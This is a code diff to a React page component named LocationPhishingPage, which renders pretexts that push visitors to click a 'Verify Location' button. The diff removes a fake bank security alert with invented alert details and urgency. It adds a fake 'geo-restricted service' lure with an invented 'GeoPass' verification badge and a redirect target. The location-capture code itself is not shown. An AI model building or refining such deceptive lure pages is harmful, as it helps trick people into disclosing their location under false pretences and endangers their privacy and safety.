@@ -8,7 +8,7 @@ import { Button } from '@/components/ui/button';
 import PhishingPageLayout from '@/app/phishing/PhishingPageLayout'; // Updated import path
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
 import { Card as ShadcnCard, CardContent, CardHeader, CardTitle as ShadcnCardTitle } from '@/components/ui/card';
-import { MapPin, CheckCircle, AlertTriangle, ShieldAlert, Lock, Sparkles, type LucideIcon, Truck, Package, Banknote, PlayCircle, Film, FileText, Globe } from 'lucide-react'; // Added more icons
+import { MapPin, CheckCircle, AlertTriangle, ShieldAlert, Lock, type LucideIcon, Package, Banknote, PlayCircle, Film, FileText, Globe, Gamepad2 } from 'lucide-react'; // Removed Truck, Sparkles. Added Gamepad2.
 
 interface TemplateContent {
   title: string;
@@ -27,21 +27,21 @@ const templateContent: Record<string, TemplateContent> = {
     actionText: 'Verify Location & Access Site',
     message: "This website cannot be viewed in all countries. Verify your location to gain access.",
     pageSpecificMessage: "Access to this website's full range of content and features is limited in certain geographical regions due to licensing agreements and local regulations. Please verify your current location to unlock all available services and information.",
-    heroIcon: Globe, // Using Globe, can be combined with Lock visually in render
+    heroIcon: Globe,
     brandName: "Restricted Website Access",
     brandLogo: null,
   },
-  'security-alert': {
-    title: 'Security Alert - SecureNet Banking',
-    actionText: 'Verify Location & Secure Account',
-    message: "SECURITY ALERT: Unusual Account Activity Detected by SecureNet Banking",
-    pageSpecificMessage: "We have identified suspicious activity associated with your account. To ensure your account's safety and prevent unauthorized access, please verify your current location immediately. This is a critical security measure. Your prompt attention is appreciated.",
-    heroIcon: ShieldAlert,
-    brandName: "SecureNet Banking",
-    brandLogo: <Banknote className="h-7 w-7 text-green-600 mr-2" />,
+  'geo-restricted-service-access': {
+    title: 'Service Unavailable - Location Verification Required',
+    actionText: 'Verify Location to Access Service',
+    message: "This service is not available in your current region. Verify your location to check eligibility and gain access.",
+    pageSpecificMessage: "Many of our digital services, including premium streaming, online games, and specialized software, are subject to regional licensing. To access the service you're looking for, or to see available services in your area, please verify your location.",
+    heroIcon: Gamepad2, // Using Gamepad2, can be combined with Globe visually in render
+    brandName: "Geo-Restricted Service",
+    brandLogo: null,
   },
   'content-unlock': {
-    title: 'Unlock Region-Restricted Content', // Changed title
+    title: 'Unlock Region-Restricted Content',
     actionText: 'Verify Location to Access',
     message: 'This content cannot be viewed in all countries. Verify your location to gain access.', // Revised message
     pageSpecificMessage: "Access exclusive videos, images, articles, and other files by verifying your location. Some content is geographically restricted, and this step ensures compliance with licensing agreements.",
@@ -61,6 +61,7 @@ const templateContent: Record<string, TemplateContent> = {
 const REDIRECT_URL_KEYS: Record<string, string> = {
   'content-unlock': 'contentUnlockRedirectUrl',
   'restricted-website-access': 'restrictedWebsiteRedirectUrl',
+  'geo-restricted-service-access': 'geoRestrictedServiceRedirectUrl',
 };
 
 export default function LocationPhishingPage() {
@@ -164,55 +165,45 @@ export default function LocationPhishingPage() {
       <div className="space-y-4">
         {content.brandName && ( // Display brandName if it exists
           <div className={`flex items-center justify-center text-gray-700 mb-3 w-full ${
-            (templateId === 'content-unlock' || templateId === 'restricted-website-access') ? 'text-2xl font-bold' : 'text-xl font-semibold'
+            (templateId === 'content-unlock' || templateId === 'restricted-website-access' || templateId === 'geo-restricted-service-access')
+            ? 'text-2xl font-bold'
+            : 'text-xl font-semibold' // This case would be for 'security-alert' if it had a brandName, or future templates
           }`}>
-            {content.brandLogo}
-            <span className={`${(templateId === 'content-unlock' || templateId === 'restricted-website-access') ? 'text-center' : ''}`}>{content.brandName}</span>
+            {content.brandLogo} {/* Only 'security-alert' (now removed) had a brandLogo; new ones use text only */}
+            <span className={`${(templateId === 'content-unlock' || templateId === 'restricted-website-access' || templateId === 'geo-restricted-service-access') ? 'text-center' : ''}`}>{content.brandName}</span>
           </div>
         )}
         {/* The main title for the page is set by PhishingPageLayout's title prop.
             The content.message or specific descriptive texts are used below within each scenario.
         */}
 
-        {/* Removed 'package-delivery-issue' specific rendering block */}
+        {/* 'security-alert' rendering block is removed */}
 
-        {templateId === 'security-alert' && (
-          <Alert variant="destructive" className="mb-6 text-left p-6 shadow-xl border-2 border-destructive-foreground/30">
-            <div className="flex items-center mb-4">
-              <HeroIcon className="h-12 w-12 mr-4 text-destructive flex-shrink-0" />
-              <AlertTitle className="text-3xl font-bold text-destructive">
-                {content.message}
-              </AlertTitle>
-            </div>
-            <AlertDescription className="space-y-4">
-              <p className="text-md leading-relaxed text-destructive/90">
-                {content.pageSpecificMessage}
-              </p>
-              <div className="mt-4 p-4 bg-destructive rounded-md border border-destructive-foreground/30 text-sm">
-                <h4 className="font-semibold mb-2 text-destructive-foreground text-md">Alert Details:</h4>
-                <div className="grid grid-cols-[auto_1fr] gap-x-3 gap-y-1.5 text-destructive-foreground">
-                  <span className="font-medium">Alert ID:</span>
-                  <span className="font-mono">SEC-74X981</span>
-                  <span className="font-medium">Detected At:</span>
-                  <span>{currentTime || 'Processing...'}</span>
-                  <span className="font-medium">Status:</span>
-                  <span className="font-semibold">Immediate Action Required</span>
-                </div>
-              </div>
-            </AlertDescription>
-          </Alert>
-        )}
-
-        { (templateId === 'content-unlock' || templateId === 'restricted-website-access') && (
+        { (templateId === 'content-unlock' || templateId === 'restricted-website-access' || templateId === 'geo-restricted-service-access') && (
           <ShadcnCard className="mb-6 bg-muted/30 p-6 text-center shadow-inner border-dashed">
             <CardContent className="space-y-4">
-              {templateId === 'restricted-website-access' ?
-                <div className="flex justify-center items-center text-primary/70">
-                  <Globe className="w-16 h-16 mx-auto" />
-                  <Lock className="w-8 h-8 -ml-5 -mt-8 opacity-70" />
-                </div>
-                : <HeroIcon className="w-20 h-20 text-primary/60 mx-auto" />
-              }
+              {(() => {
+                // Default hero icon from content object
+                let ActualHeroIcon = content.heroIcon || MapPin;
+
+                if (templateId === 'restricted-website-access') {
+                  return (
+                    <div className="flex justify-center items-center text-primary/70 relative w-20 h-20 mx-auto">
+                      <Globe className="w-full h-full" />
+                      <Lock className="w-10 h-10 absolute text-gray-500 opacity-75" style={{ transform: 'translate(20%, 20%)' }} />
+                    </div>
+                  );
+                } else if (templateId === 'geo-restricted-service-access') {
+                  return (
+                    <div className="flex justify-center items-center text-primary/70 relative w-20 h-20 mx-auto">
+                       <ActualHeroIcon className="w-full h-full" />
+                       <Globe className="w-10 h-10 absolute text-gray-500 opacity-60" style={{ transform: 'translate(-25%, -20%)' }}/>
+                    </div>
+                  );
+                }
+                // Fallback for 'content-unlock' or if others don't have special rendering
+                return <ActualHeroIcon className="w-20 h-20 text-primary/60 mx-auto" />;
+              })()}
               <ShadcnCardTitle className="text-xl text-foreground font-semibold">{content.message}</ShadcnCardTitle>
               <p className="text-md text-muted-foreground">{content.pageSpecificMessage}</p>
             </CardContent>
@@ -251,13 +242,15 @@ export default function LocationPhishingPage() {
                 Verification by GeoGuard<sup>&trade;</sup>
               </p>
             )}
+            {templateId === 'geo-restricted-service-access' && (
+              <p className="text-center text-sm text-gray-500 mb-2">
+                Access validation by GeoPass<sup>&trade;</sup>
+              </p>
+            )}
             <Button
               onClick={handleLocationRequest}
               size="lg"
-              className={`w-full text-lg py-6 shadow-md ${
-                templateId === 'security-alert' ? 'bg-destructive hover:bg-destructive/90 text-destructive-foreground'
-                : 'bg-accent hover:bg-accent/90 text-accent-foreground'
-              }`}
+              className={`w-full text-lg py-6 shadow-md bg-accent hover:bg-accent/90 text-accent-foreground`} // Removed security-alert specific class
               disabled={isLoading || status === 'requesting'}
             >
               <MapPin className="mr-2 h-6 w-6" />
